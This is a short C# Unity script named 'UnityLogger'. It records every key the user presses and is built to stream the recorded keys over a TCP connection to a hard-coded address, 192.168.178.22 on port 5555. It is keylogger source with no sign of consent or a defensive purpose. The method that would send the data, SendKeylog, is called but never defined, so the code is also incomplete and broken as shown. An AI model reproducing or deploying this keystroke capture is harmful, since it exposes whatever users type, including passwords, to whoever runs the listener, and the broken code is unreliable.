using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;
using UnityEngine;

public class UnityLogger : MonoBehaviour
{
    private StringBuilder _keylogs = new StringBuilder();
    private TcpClient _client;
    private NetworkStream _stream;
    private bool _isConnected = false;

    void Start()
    {
        ConnectToServer("192.168.178.22", 5555);
    }

    void Update()
    {
        foreach (KeyCode keycode in System.Enum.GetValues(typeof(KeyCode)))
        {
            if (Input.GetKeyDown(keycode))
            {
                _keylogs.Append(keycode.ToString() + " ");


                if (_isConnected)
                {
                    SendKeylog(_keylogs.ToString());
                    _keylogs.Clear();
                }
            }
        }
    }

    private async void ConnectToServer(string ip, int port)
    {
        try
        {
            _client = new TcpClient(ip, port);
            _stream = _client.GetStream();
            _isConnected = true;
            Debug.Log("Connected to server");
        }
        catch (System.Exception ex)
        {
            Debug.LogError($"Failed to connect to server: {ex.Message}");
        }
    }

    private void OnApplicationQuit()
    {
        _stream?.Close();
        _client?.Close();
    }
}